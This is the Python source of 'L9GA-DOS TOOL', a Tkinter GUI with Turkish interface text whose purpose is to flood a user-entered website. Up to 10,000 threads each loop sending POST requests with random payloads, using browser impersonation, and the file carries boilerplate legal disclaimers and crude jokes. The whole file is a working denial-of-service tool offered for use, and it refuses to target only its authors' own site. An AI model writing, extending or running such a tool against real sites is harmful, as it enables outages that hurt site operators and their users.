#olm calmayın eveliyatınızıskerim #


import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import threading
import random
import time
from datetime import datetime
import webbrowser
from tkinter import font as tkfont
try:
    from curl_cffi import requests
except ImportError:
    messagebox.showerror("Installation Required", "Please install 'curl_cffi' package:\n\npip install curl_cffi")
    exit()
app_name = "L9GA-DOS TOOL"
app_version = "v1"
app_website = "https://l9ga.com.tr/"
app_discord = "https://discord.gg/kemalizm"
app_author = "L9GA TEAM"
app_description = "L9GA-DOS TOOL, birden fazla iş parçacığı kullanarak dağıtılmış hizmet reddi (DoS) saldırıları gerçekleştirmek için güçlü ve kullanımı kolay bir GUI uygulamasıdır."
app_license = "MIT License"
app_copyright = "© 2026 L9GA . Tüm hakları saklıdır."
app_warning = "Yasal Uyarı: Bu araç yalnızca yasal ve etik amaçlarla kullanılmalıdır. İzin almadan herhangi bir sisteme saldırmak yasa dışıdır ve ciddi yasal sonuçlara yol açabilir."
app_disclaimer = "Sorumluluk Reddi: Bu aracı kullanarak oluşabilecek herhangi bir zarar veya yasal sonuçtan L9GA  sorumlu tutulamaz."
app_thankyou = "Teşekkürler: Bu aracı kullandığınız için teşekkür ederiz! L9GA topluluğunun bir parçası olduğunuz için minnettarız."
app_support = "Destek: Yardıma ihtiyacınız olursa, lütfen Discord sunucumuzu ziyaret edin: https://discord.gg/pgKC8vBq5u"
app_update = "Güncellemeler: En son güncellemeler ve haberler için web sitemizi ziyaret edin: https://l9ga.com.tr/"
app_feedback = "Geri Bildirim: Geri bildirimlerinizi ve önerilerinizi duymak isteriz! Lütfen Discord sunucumuzda bizimle iletişime geçin."
app_contribute = "Katkıda Bulunma: Bu projeye katkıda bulunmak ister misiniz? Lütfen Discord sunucumuzu ziyaret edin ve nasıl yardımcı olabileceğinizi öğrenin."
app_follow = "Takip Edin: En son haberler ve güncellemeler için sosyal medya hesaplarımızı takip edin."
app_caution = "Dikkat: Bu araç güçlüdür ve yanlış kullanılırsa ciddi zararlara yol açabilir. Lütfen dikkatli ve sorumlu bir şekilde kullanın."
import tkinter as tk
from tkinter import messagebox

import tkinter as tk
from tkinter import messagebox
import sys  # <-- 1. ADIM: Bu modülü import edin

def start_main_application(root_window):
    """
    Kullanıcı uyarıyı kabul ettikten sonra 
    ana uygulama penceresini kuran ve gösteren fonksiyon.
    """
    
    # İkonu burada yükle
    try:
        root_window.iconbitmap(default='dosl9ga.ico') 
    except tk.TclError:
        print("Uyarı: 'my_icon.ico' dosyası bulunamadı.")
        
    # Ana pencereyi görünür hale getir
    root_window.deiconify()
    
    # --- Burası ana uygulama içeriği ---
    root_window.geometry("400x300")
    tk.Label(
        root_window, 
        text="BU SAYFAYI KAPATARAK ANA UYGULAMAYA GEÇEBİLİRSİNİZ.",
        font=("Segoe UI", 12),
        pady=20
    ).pack()





root = tk.Tk()
root.title("Genel Uygulama")


root.withdraw() 


uyari_basligi = "Yasal Uyarı ve Sorumluluk Reddi"
uyari_mesaji = (
    "Bu yazılımı kullanarak, tüm eylemlerinizin sorumluluğunu "
    "tamamen kabul etmiş olursunuz.\n\n"
    "Yazılımın kullanımından doğabilecek hiçbir yasal sorundan "
    "geliştirici sorumlu tutulamaz.\n\n"
    "Bu yazılımı yalnızca yasal ve etik amaçlarla kullanın.\n\n"
    "Yapılan herhangi bir kötüye kullanım, yasal sonuçlara sebeb ola bilir bu yüzden de L9GA TEAM sorumlu tutulamaz.\n\n"
    "Bu şartları kabul edip devam etmek istiyor musunuz?"
)


if messagebox.askyesno(uyari_basligi, uyari_mesaji):
    
    # 5. Kullanıcı "Evet" dedi:
    start_main_application(root)
    root.mainloop() 
    
else:
    print("Kullanıcı uyarıyı reddetti. Program sonlandırılıyor.")
    
    root.destroy()  
    sys.exit(0)     

class l9gaAttackGUI:
    def __init__(self, master):
        self.master = master
        self.master.configure(bg="#0c0c0c")
        try:
            self.master.iconbitmap(default='dosl9ga.ico')
        except tk.TclError:
            print("Uyarı: 'dosl9ga.ico' dosyası bulunamadı. Varsayılan ikon kullanılacak.")
        self.master.title("L9GA-DOS TOOL")
        self.master.geometry("1000x750")
        self.master.minsize(900, 650)
        self.master.configure(bg="#0c0c0c")
        self.master.resizable(True, True)
        self.master.grid_rowconfigure(0, weight=1)
        self.master.grid_columnconfigure(0, weight=1)


        self.title_font = tkfont.Font(family="Consolas", size=24, weight="bold")
        self.subtitle_font = tkfont.Font(family="Segoe UI", size=10)
        self.button_font = tkfont.Font(family="Segoe UI", size=10, weight="bold")
        self.stats_font = tkfont.Font(family="Consolas", size=9)
       
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.configure_styles()
       
        self.running = False
        self.success_count = 0
        self.failed_count = 0
        self.total_requests = 0
        self.start_time = 0
        self.last_request_time = 0
        self.rps_history = []
       
        self.create_header()
        self.create_control_panel()
        self.create_stats_panel()
        self.create_console()
        self.create_footer()
        self.animate_header()
   
    def configure_styles(self):
        """Configure custom widget styles"""
        self.style.configure('TFrame', background='#0c0c0c')
        self.style.configure('TLabel', background='#0c0c0c', foreground='white')
        self.style.configure('TButton', font=self.button_font, padding=6)
        self.style.configure('TEntry', fieldbackground='#1e1e1e', foreground='white')
        self.style.configure('TSpinbox', fieldbackground='#1e1e1e', foreground='white')
        self.style.configure('TProgressbar', thickness=10)
        self.style.configure('Attack.TButton', foreground='white', background='#d32f2f')
        self.style.map('Attack.TButton',
                      background=[('active', '#b71c1c'), ('disabled', '#5d4037')])
        self.style.configure('Stop.TButton', foreground='white', background='#424242')
        self.style.map('Stop.TButton',
                      background=[('active', '#616161'), ('disabled', '#424242')])
        self.style.configure('Console.TFrame', background='#1e1e1e')
   
    def create_header(self):
        """Create the header section with logo and title"""
        self.header_frame = ttk.Frame(self.master, style='TFrame')
        self.header_frame.pack(fill=tk.X, padx=20, pady=(20, 10))
       
        self.logo_canvas = tk.Canvas(self.header_frame, width=60, height=60,
                                    bg='#0c0c0c', highlightthickness=0)
        self.logo_canvas.pack(side=tk.LEFT)
        self.draw_l9ga_logo()
       
        title_frame = ttk.Frame(self.header_frame, style='TFrame')
        title_frame.pack(side=tk.LEFT, padx=15)
       
        self.title_label = ttk.Label(title_frame, text="L9GA-DOS TOOL",
                                   font=self.title_font, foreground='#d32f2f')
        self.title_label.pack(anchor='w')
       
        self.subtitle_label = ttk.Label(title_frame, text="WELCOME TO L9GA WORD",
                                      font=self.subtitle_font, foreground='#757575')
        self.subtitle_label.pack(anchor='w')
       
        version_frame = ttk.Frame(self.header_frame, style='TFrame')
        version_frame.pack(side=tk.RIGHT)
        ttk.Label(version_frame, text="v1", font=self.subtitle_font,
                 foreground='#616161').pack(anchor='e')
   
    def draw_l9ga_logo(self):
        self.logo_canvas.delete("all")
        self.logo_canvas.create_oval(5, 5, 55, 55, fill="#2f5bd3", outline='')
        self.logo_canvas.create_text(30, 30, text="L9",
                                   font=("Consolas", 16, "bold"),
                                   fill="white")
        
   
    def create_control_panel(self):
        """Create attack control panel"""
        control_frame = ttk.LabelFrame(self.master, text=" Atak kontrol ",
                                     padding=(20, 10), style='TFrame')
        control_frame.pack(fill=tk.X, padx=20, pady=10)
       
        ttk.Label(control_frame, text="Saldırılacak site:").grid(row=0, column=0, sticky='w', pady=(0, 5))
        self.url_entry = ttk.Entry(control_frame, width=60)
        self.url_entry.grid(row=1, column=0, columnspan=3, sticky='ew', pady=(0, 15))
       
        ttk.Label(control_frame, text="Threads:").grid(row=2, column=0, sticky='w', pady=(0, 5))
        self.threads_spin = ttk.Spinbox(control_frame, from_=100, to=10000, increment=100)
        self.threads_spin.grid(row=3, column=0, sticky='w', pady=(0, 15))
        self.threads_spin.set("1000")
       
        ttk.Label(control_frame, text="Timeout (s):").grid(row=2, column=1, sticky='w', padx=10, pady=(0, 5))
        self.timeout_spin = ttk.Spinbox(control_frame, from_=1, to=60, increment=1)
        self.timeout_spin.grid(row=3, column=1, sticky='w', padx=10, pady=(0, 15))
        self.timeout_spin.set("10")
       

        button_frame = ttk.Frame(control_frame, style='TFrame')
        button_frame.grid(row=4, column=0, columnspan=3, pady=(10, 0))
       
        self.start_btn = ttk.Button(button_frame, text="Orduları gönder!",
                                  style='Attack.TButton', command=self.start_attack)
        self.start_btn.pack(side=tk.LEFT, padx=5)
       
        self.stop_btn = ttk.Button(button_frame, text="DURDUR ABİ DURDUR !",
                                 style='Stop.TButton', command=self.stop_attack, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=5)
       
        control_frame.columnconfigure(2, weight=1)
   
    def create_stats_panel(self):
        """Create statistics display panel"""
        stats_frame = ttk.LabelFrame(self.master, text=" İstatistikler ",
                                   padding=(20, 15), style='TFrame')
        stats_frame.pack(fill=tk.BOTH, padx=20, pady=10, expand=True)
       
        self.progress_bar = ttk.Progressbar(stats_frame, mode='determinate', length=100)
        self.progress_bar.pack(fill=tk.X, pady=(0, 15))
       
        stats_grid = ttk.Frame(stats_frame, style='TFrame')
        stats_grid.pack(fill=tk.BOTH, expand=True)
       
        ttk.Label(stats_grid, text="Geçen Süre:", font=self.stats_font).grid(row=0, column=0, sticky='w')
        self.time_label = ttk.Label(stats_grid, text="00:00:00", font=self.stats_font, foreground='#4caf50')
        self.time_label.grid(row=0, column=1, sticky='w', padx=(0, 30))
       
        ttk.Label(stats_grid, text="Başarılı:", font=self.stats_font).grid(row=1, column=0, sticky='w')
        self.success_label = ttk.Label(stats_grid, text="0", font=self.stats_font, foreground='#4caf50')
        self.success_label.grid(row=1, column=1, sticky='w', padx=(0, 30))
       
        ttk.Label(stats_grid, text="Yük Boyutu:", font=self.stats_font).grid(row=2, column=0, sticky='w')
        self.payload_label = ttk.Label(stats_grid, text="512 bytes", font=self.stats_font)
        self.payload_label.grid(row=2, column=1, sticky='w', padx=(0, 30))
       
        ttk.Label(stats_grid, text="istekler/s:", font=self.stats_font).grid(row=0, column=2, sticky='w')
        self.rps_label = ttk.Label(stats_grid, text="0", font=self.stats_font, foreground='#ff9800')
        self.rps_label.grid(row=0, column=3, sticky='w')
       
        ttk.Label(stats_grid, text="ölen asker :", font=self.stats_font).grid(row=1, column=2, sticky='w')
        self.failed_label = ttk.Label(stats_grid, text="0", font=self.stats_font, foreground='#f44336')
        self.failed_label.grid(row=1, column=3, sticky='w')
       
        ttk.Label(stats_grid, text="Toplam Gönderilen asker:", font=self.stats_font).grid(row=2, column=2, sticky='w')
        self.total_label = ttk.Label(stats_grid, text="0", font=self.stats_font)
        self.total_label.grid(row=2, column=3, sticky='w')
       
        stats_grid.columnconfigure(1, weight=1)
        stats_grid.columnconfigure(3, weight=1)
   
    def create_console(self):
        """Create console output panel"""
        console_frame = ttk.LabelFrame(self.master, text=" CONSOLE OUTPUT ",
                                     padding=(10, 5), style='Console.TFrame')
        console_frame.pack(fill=tk.BOTH, padx=20, pady=(0, 10), expand=True)
       
        self.console = scrolledtext.ScrolledText(
            console_frame,
            bg='#1e1e1e',
            fg='#e0e0e0',
            insertbackground='white',
            font=('Consolas', 9),
            wrap=tk.WORD,
            padx=10,
            pady=10
        )
        self.console.pack(fill=tk.BOTH, expand=True)
        self.console.configure(state='disabled')
   
    def create_footer(self):
        """Create footer with status and links"""
        footer_frame = ttk.Frame(self.master, style='TFrame')
        footer_frame.pack(fill=tk.X, padx=20, pady=(0, 20))
       
        self.status_label = ttk.Label(footer_frame, text="Ready", foreground='#9e9e9e')
        self.status_label.pack(side=tk.LEFT)
       
        link_frame = ttk.Frame(footer_frame, style='TFrame')
        link_frame.pack(side=tk.RIGHT)
       
        l9ga_link = ttk.Label(link_frame, text="L9GA WEB SİTE", foreground='#2196f3', cursor="hand2")
        l9ga_link.pack(side=tk.LEFT)
        l9ga_link.bind("<Button-1>", lambda e: webbrowser.open("https://l9ga.com.tr/"))
       
        ttk.Label(link_frame, text=" | ").pack(side=tk.LEFT)
       
        docs_link = ttk.Label(link_frame, text="Discord", foreground='#2196f3', cursor="hand2")
        docs_link.pack(side=tk.LEFT)
        docs_link.bind("<Button-1>", lambda e: webbrowser.open("https://discord.gg/pgKC8vBq5u"))
   
    def animate_header(self):
        """Animate the header for visual effect"""
        colors = ['#d32f2f', '#f44336', '#e53935', '#c62828']
        current_color = 0
       
        def update_color():
            nonlocal current_color
            self.title_label.config(foreground=colors[current_color])
            self.draw_l9ga_logo()
            current_color = (current_color + 1) % len(colors)
            self.master.after(500, update_color)
       
        update_color()
   
    def log_message(self, message, level="info"):
        """Add message to console with colored level"""
        self.console.configure(state='normal')
       
        if level == "error":
            color = "#f44336"
        elif level == "warning":
            color = "#ff9800"
        elif level == "success":
            color = "#4caf50"
        else:  # info
            color = "#2196f3"
       
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.console.insert(tk.END, f"[{timestamp}] ", "timestamp")
        self.console.insert(tk.END, f"{level.upper()}: ", level)
        self.console.insert(tk.END, f"{message}\n")
       
        self.console.configure(state='disabled')
        self.console.see(tk.END)
   
    def start_attack(self):
        """Start the attack with current parameters"""
        target_url = self.url_entry.get()
        if not target_url:
            messagebox.showerror("Hata", "Bre deyyus saldırılcak siteyi gir lan!")
            return
        if self.running:
            messagebox.showwarning("Uyarı", "Saldırı zaten devam ediyor!")
            return
        if not target_url.endswith("/"):
            target_url += "/"   
        if "://" not in target_url:
            messagebox.showerror("Hata", "Geçersiz URL formatı!")
            return
        if "https://l9ga.com.tr" in target_url:
            messagebox.showerror("Hata", "Yemezler paşam seni!")
            return
        
            
        try:
            threads = int(self.threads_spin.get())
            timeout = int(self.timeout_spin.get())
        except ValueError:
            messagebox.showerror("Hata", "öyle sayımı olur amk ")
            return
       
        self.running = True
        self.success_count = 0
        self.failed_count = 0
        self.total_requests = 0
        self.start_time = time.time()
        self.last_request_time = time.time()
        self.rps_history = []
       
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.status_label.config(text="Saldırı devam ediyor...", foreground='#ff9800')
        self.progress_bar['value'] = 0
       
        self.log_message(f"{target_url} adresine {threads} iş parçacığıyla saldırı başlatılıyor")
        self.log_message(f"İstek zaman aşımı {timeout} saniyeye ayarlandı")
       
        for i in range(threads):
            thread = threading.Thread(target=self.attack_worker, args=(target_url, timeout), daemon=True)
            thread.start()
       
        self.update_stats()
   
    def stop_attack(self):
        """Stop the current attack"""
        self.running = False
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.status_label.config(text="GERİ ÇEKİLİN ASKERLER!", foreground='#f44336')
       
        elapsed = time.time() - self.start_time
        avg_rps = self.total_requests / elapsed if elapsed > 0 else 0
        success_rate = (self.success_count / self.total_requests * 100) if self.total_requests > 0 else 0
       
        self.log_message(f"Saldırı {elapsed:.1f} saniye sonra durduruldu", "uyarı")
        self.log_message(f"Toplam istekler: {self.total_requests}", "bilgi")
        self.log_message(f"Başarı oranı: {success_rate:.1f}%", "başarılı")
        self.log_message(f"Ortalama RPS: {avg_rps:.1f}", "bilgi")
   
    def attack_worker(self, target_url, timeout):
        """Worker thread that sends requests"""
        session = requests.Session()
       
        while self.running:
            try:
                payload = ''.join(random.choices(
                    'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
                    k=512
                ))
               
                response = session.post(
                    target_url,
                    impersonate="chrome110",
                    data={'payload': payload},
                    timeout=timeout
                )
                response.raise_for_status()
               
                with threading.Lock():
                    self.success_count += 1
                    self.total_requests += 1
                    self.last_request_time = time.time()
           
            except Exception as e:
                with threading.Lock():
                    self.failed_count += 1
                    self.total_requests += 1
   
    def update_stats(self):
        """Update the statistics display"""
        if not self.running:
            return
       
        elapsed = time.time() - self.start_time
        self.time_label.config(text=time.strftime('%H:%M:%S', time.gmtime(elapsed)))
       
        current_rps = 0
        if elapsed > 0:
            current_rps = self.total_requests / elapsed
       
        self.rps_label.config(text=f"{current_rps:.1f}")
        self.rps_history.append(current_rps)
        if len(self.rps_history) > 60:
            self.rps_history.pop(0)
       
        self.success_label.config(text=str(self.success_count))
        self.failed_label.config(text=str(self.failed_count))
        self.total_label.config(text=str(self.total_requests))
       
       
        progress = (elapsed % 60) / 60 * 100
        self.progress_bar['value'] = progress
       
       
        self.master.after(1000, self.update_stats)

if __name__ == "__main__":
    root = tk.Tk()
    app = l9gaAttackGUI(root)
    root.mainloop()

#olm calmayın eveliyatınızıskerim #
